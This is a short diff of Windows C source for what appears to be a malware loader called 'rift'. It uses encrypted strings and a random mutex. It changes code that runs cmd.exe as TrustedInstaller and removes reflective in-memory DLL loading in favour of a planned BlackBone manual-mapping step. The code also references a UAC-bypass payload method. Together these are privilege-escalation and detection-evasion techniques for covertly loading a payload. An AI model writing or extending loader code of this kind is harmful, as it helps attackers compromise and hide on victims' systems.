@@ -1,4 +1,4 @@
-#include "_rift.h"
+#include "_riftldr.h"
 
 typedef BOOL(*pEDllInit)(_In_ PPIB);
 typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);
@@ -27,9 +27,9 @@ INT WINAPI wWinMain(
 		IGenerateSessionId(&g_PIB->sID.SE);
 	}
 
-	ERunAsTrustedInstaller(L"C:\WINDOWS\system32\cmd.exe", NULL, NULL);
+//	ERunAsTrustedInstaller(L"C:\WINDOWS\system32\cmd.exe", NULL, NULL);
 
-	// Create Random Mutex using SId
+	// Create Random Mutex using SeId
 	SIZE_T nResult;
 	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
 	PWSTR szMutex = AllocMemory(MAX_PATH * sizeof(WCHAR));
@@ -65,15 +65,7 @@ INT WINAPI wWinMain(
 		return 0x132d;
 
 #ifndef _DEBUG
-	// "Reflective" DLL loading will only be used in the release build
-	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
-	if (!hDll)
-		return 0x276f;
-
-	pEDllInit EDllInit = (pEDllInit)MemoryGetProcAddress(hDll, "EDllInit");
-	int a = EDllInit(10);
-
-	MemoryFreeLibrary(hDll);
+	// Implement Manual Mapping using BlackBone
 #else
 	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
 	if (!dhDll)
